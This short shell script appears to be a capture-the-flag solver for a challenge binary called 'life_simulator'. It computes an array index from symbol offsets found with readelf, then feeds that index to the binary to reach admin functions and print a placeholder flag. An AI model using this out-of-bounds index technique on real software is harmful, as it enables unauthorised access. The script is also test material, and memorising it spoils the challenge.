#!/bin/sh

admin_functions=$(readelf -s container/life_simulator | awk '/\<admin_functions\>/{print $2}')
functions=$(readelf -s container/life_simulator | awk '/\<functions\>/{print $2}')
index=$(echo "ibase=16; ($admin_functions - $functions) / 8" \ | bc)

echo "$index" | FLAG=THISISFLAG container/life_simulator | grep THISISFLAG
